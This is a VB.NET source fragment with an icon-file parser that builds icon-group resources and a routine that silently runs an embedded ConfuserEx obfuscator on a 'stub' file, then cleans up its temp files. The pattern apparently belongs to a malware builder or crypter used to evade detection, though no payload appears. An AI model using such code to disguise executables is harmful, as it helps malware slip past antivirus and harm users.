            End Get
        End Property

        Private Sub New()
        End Sub

        Public Shared Function FromFile(ByVal filename As String) As IconFile
            Dim instance As New IconFile
            ' Read all the bytes from the file.
            Dim fileBytes() As Byte = IO.File.ReadAllBytes(filename)
            ' First struct is an ICONDIR
            ' Pin the bytes from the file in memory so that we can read them.
            ' If we didn't pin them then they could move around (e.g. when the
            ' garbage collector compacts the heap)
            Dim pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned)
            ' Read the ICONDIR
            instance.iconDir = DirectCast(Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
            ' which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
            instance.iconEntry = New ICONDIRENTRY(instance.iconDir.Count - 1) {}
            instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
            ' The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
            Dim offset = Marshal.SizeOf(instance.iconDir)
            ' After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
            Dim iconDirEntryType = GetType(ICONDIRENTRY)
            Dim size = Marshal.SizeOf(iconDirEntryType)
            For i = 0 To instance.iconDir.Count - 1
                ' Grab the structure.
                Dim entry = DirectCast(Marshal.PtrToStructure(New IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), ICONDIRENTRY)
                instance.iconEntry(i) = entry
                ' Grab the associated pixel data.
                instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                offset += size
            Next
            pinnedBytes.Free()
            Return instance
        End Function

        Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
            ' This will store the memory version of the icon.
            Dim sizeOfIconGroupData As Integer = Marshal.SizeOf(GetType(ICONDIR)) + Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * ImageCount
            Dim data(sizeOfIconGroupData - 1) As Byte
            Dim pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned)
            Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
            Dim offset = Marshal.SizeOf(iconDir)
            For i = 0 To ImageCount - 1
                Dim grpEntry As New GRPICONDIRENTRY
                Dim bitmapheader As New BITMAPINFOHEADER
                Dim pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned)
                Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                pinnedBitmapInfoHeader.Free()
                grpEntry.Width = iconEntry(i).Width
                grpEntry.Height = iconEntry(i).Height
                grpEntry.ColorCount = iconEntry(i).ColorCount
                grpEntry.Reserved = iconEntry(i).Reserved
                grpEntry.Planes = bitmapheader.Planes
                grpEntry.BitCount = bitmapheader.BitCount
                grpEntry.BytesInRes = iconEntry(i).BytesInRes
                grpEntry.ID = CType(iconBaseID + i, UShort)
                Marshal.StructureToPtr(grpEntry, New IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                offset += Marshal.SizeOf(GetType(GRPICONDIRENTRY))
            Next
            pinnedData.Free()
            Return data
        End Function

    End Class

End Class
#End Region
#Region "CONFUSEREX"
Friend Class Confuser
    <DebuggerNonUserCode()>
    Public Sub New()
    End Sub
    Public Shared Sub Obfuscate(hSlyGQfwnjPpVOnmKFKsqFmQh As String)
        Try

            Dim text As String = Path.GetTempPath() + "configconfuser.crproj"
            Dim text2 As String = My.Resources.config
            Dim text3 As String = Path.GetTempPath() + "Confuser"
            Dim text4 As String = New FileInfo(hSlyGQfwnjPpVOnmKFKsqFmQh).Directory.ToString()
            text2 = text2.Replace("%path%", text4 + "\" + Randomization.RandomPassword.Generate(5, 5)).Replace("%basedir%", text4).Replace("%stub%", hSlyGQfwnjPpVOnmKFKsqFmQh)
            File.WriteAllText(text, text2)
            File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", My.Resources.ConfuserEx)
            Dim flag As Boolean = Directory.Exists(text3)
            If flag Then
                Directory.Delete(text3, True)
            End If
            Directory.CreateDirectory(text3)
            ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", text3)
            Dim process As Process = process.Start(New ProcessStartInfo() With {.FileName = text3 + "\Confuser.CLI.exe", .UseShellExecute = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = "-n " + text})
            process.WaitForExit()
            File.Delete(Path.GetTempPath() + "confuser.zip")
            File.Delete(Path.GetTempPath() + "configconfuser.crproj")
            Directory.Delete(text3, True)
        Catch ex As Exception
        End Try
    End Sub
End Class
#End Region